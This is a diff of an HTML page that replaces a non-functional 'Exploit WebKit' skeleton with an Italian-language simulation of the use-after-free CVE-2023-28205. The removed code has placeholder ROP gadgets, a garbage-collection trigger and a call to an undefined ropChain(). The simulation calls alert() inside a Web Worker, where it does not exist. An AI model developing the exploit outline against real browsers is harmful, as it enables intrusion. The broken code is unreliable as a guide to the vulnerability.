@@ -1,121 +1,121 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exploit WebKit</title>
-    <style>
-        #runExploit {
-            background-color: blue;
-            color: white;
-            font-size: 20px;
-            padding: 10px 20px;
-            border: none;
-            cursor: pointer;
-        }
+    <title>Simulazione CVE-2023-28205</title>
+</head>
+<body>
+    <h1>Simulazione Use-After-Free (CVE-2023-28205)</h1>
+    <p>Questa è una SIMULAZIONE. Non è un exploit funzionante.</p>
+    <p>I risultati della simulazione (e potenziali errori simulati) saranno mostrati con degli alert.</p>
 
-        #runExploit:active {
-            background-color: darkblue;
-        }
-    </style>
     <script>
-        const gadgets = {
-            pop_rdi: 0x0000000000401234,
-            pop_rsi: 0x0000000000405678,
-            pop_rdx: 0x0000000000409abc,
-            ret: 0x000000000040abcd,
-            system: 0x0000000000401111,
-            exit: 0x0000000000402222
-        };
+        let memoriaSimulata = new ArrayBuffer(1024);
+        let dataView = new DataView(memoriaSimulata);
 
-        function gc() {
+        function fakeRead(indirizzo) {
             try {
-                new Uint8Array(256 * 1024); // Alloca memoria per attivare il GC
-                alert('GC eseguita.');
+                let valore = dataView.getUint32(indirizzo, true);
+                console.log(`Lettura simulata da ${indirizzo}: 0x${valore.toString(16)}`);
+                return valore;
             } catch (e) {
-                alert("Errore durante la GC: " + e.message);
+                alert(`SIMULAZIONE ERRORE CRITICO: Tentativo di lettura da indirizzo non valido (${indirizzo}). Questo simula un potenziale accesso a memoria non allocata.`);
+                return 0; // Importante per evitare errori a cascata
             }
         }
 
-        function createObjectStructure(numElems) {
-            let root = new Map();
-            let msg = root;
-            let foo = [];
-
-            for (let i = 0; i < 5; i++) {
-                foo.push(new Date(0xffff));
+        function fakeWrite(indirizzo, valore) {
+            try {
+                dataView.setUint32(indirizzo, valore, true);
+                console.log(`Scrittura simulata di 0x${valore.toString(16)} a ${indirizzo}`);
+            } catch (e) {
+                alert(`SIMULAZIONE ERRORE CRITICO: Tentativo di scrittura a indirizzo non valido (${indirizzo}). Questo simula una potenziale corruzione di memoria.`);
             }
+        }
 
-            for (let i = 0; i < numElems; i++) {
-                const d = new Date(i);
-                const map = new Map();
-                msg.set(d, [map, foo]);
-                msg = map;
-            }
-
-            gc();
-            alert('Struttura oggetti creata.');
-            return root;
+        function createDataStructure() {
+            const map = new Map();
+            const date = new Date();
+            map.set('date', date);
+            return { map };
         }
 
         async function main() {
-            alert("Inizio exploit...");
+            const workerCode = `
+                let memoriaSimulataWorker = new ArrayBuffer(1024); // Memoria separata per il worker
+                let dataViewWorker = new DataView(memoriaSimulataWorker);
 
-            const numElems = 10;
-            let root = createObjectStructure(numElems);
-            let msg = root;
-            let idx = null;
-            let found = false;
-            let attempts = 0;
-            const maxAttempts = 3;
-
-            while (!found && attempts < maxAttempts) {
-                attempts++;
-                try {
-                    let data = null;
-                    const prom = new Promise(resolve => {
-                        addEventListener('message', event => {
-                            data = event.data;
-                            resolve();
-                        }, { once: true });
-                    });
-
-                    alert(`Tentativo ${attempts}: Invio messaggio...`);
-                    postMessage(msg, '*');
-                    await prom;
-
-                    alert("Messaggio ricevuto con successo.");
-                    gc();
-
-                    for (let i = 0; i < numElems; i++) {
-                        if (data.keys().next().value.getTime() === 0xffff) {
-                            idx = i;
-                            found = true;
-                            break;
-                        }
-                        data = data.values().next().value[0];
-                    }
-                } catch (e) {
-                    alert("Errore durante la ricerca dell'indice: " + e.message);
+                function fakeReadWorker(indirizzo) { // Funzioni specifiche per il worker
+                  try {
+                      let valore = dataViewWorker.getUint32(indirizzo, true);
+                      console.log(\`Worker: Lettura simulata da \${indirizzo}: 0x\${valore.toString(16)}\`);
+                      return valore;
+                  } catch (e) {
+                      alert(\`SIMULAZIONE ERRORE CRITICO NEL WORKER: Tentativo di lettura da indirizzo non valido (\${indirizzo}). Simula accesso a memoria non allocata.\`);
+                      return 0
+                  }
                 }
-            }
 
-            if (found) {
-                alert('[+] Indice trovato: ' + idx);
-                let rop = ropChain();
-                alert("ROP Chain creata. Exploit completato.");
-            } else {
-                alert("Indice non trovato. Exploit fallito.");
-            }
+                function fakeWriteWorker(indirizzo, valore) {
+                    try {
+                        dataViewWorker.setUint32(indirizzo, valore, true);
+                        console.log(\`Worker: Scrittura simulata di 0x\${valore.toString(16)} a \${indirizzo}\`);
+                    } catch (e) {
+                        alert(\`SIMULAZIONE ERRORE CRITICO NEL WORKER: Tentativo di scrittura a indirizzo non valido (\${indirizzo}). Simula corruzione di memoria.\`);
+                    }
+                }
+
+                onmessage = async function(e) {
+                    let { map } = e.data;
+                    try {
+                        await new Promise(resolve => setTimeout(resolve, 10)); // SIMULAZIONE di race condition
+
+                        if (map && map.get) { //Verifica se map e get esistono
+                            let date = map.get('date');
+
+                            if (date) {
+                                console.log("Worker: getTime prima dell'operazione (simulata):", date.getTime());
+                                fakeWriteWorker(100, 0x41414141); // Simulazione di scrittura che POTREBBE corrompere
+                                console.log("Worker: getTime dopo l'operazione (simulata):", date.getTime());
+                            } else {
+                                alert("SIMULAZIONE: L'oggetto 'date' sembra essere stato liberato (use-after-free simulato)!"); // ALERT - Use After Free Simulato
+                            }
+                        } else {
+                            alert("SIMULAZIONE: L'oggetto map è inatteso! (Probabilmente è stato liberato)");
+                        }
+
+                    } catch (error) {
+                        alert(`SIMULAZIONE ERRORE: Errore nel worker durante la simulazione: ${error}`);
+                        console.error("Worker Error:", error)
+                    }
+                    postMessage("Messaggio di ritorno dal worker");
+                };
+            `;
+
+            const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+            const workerURL = URL.createObjectURL(workerBlob);
+            const worker = new Worker(workerURL);
+
+            let data = createDataStructure();
+            worker.postMessage(data);
+
+            worker.onmessage = function(e) {
+                console.log("Main: Messaggio ricevuto dal worker:", e.data);
+                console.log("Main: Contenuto di memoriaSimulata:", new Uint8Array(memoriaSimulata));
+                try {
+                    if(data && data.map && data.map.get){
+                        console.log("Main: Tentativo di accesso a data.map.get('date').getTime()");
+                        console.log('Main: risultato getTime', data.map.get('date').getTime())
+                    } else {
+                        alert("SIMULAZIONE: L'oggetto map è inatteso nel main! (Probabilmente è stato liberato)");
+                    }
+                } catch (error) {
+                    alert(`SIMULAZIONE ERRORE: Errore nel main dopo il worker: ${error}`);
+                    console.error("Main Error:", error)
+                }
+            };
         }
 
-        document.getElementById('runExploit').addEventListener('click', async () => {
-            alert("Avvio exploit...");
-            await main();
-        });
+        main();
     </script>
-</head>
-<body>
-    <button id="runExploit">Avvia Exploit</button>
 </body>
 </html>
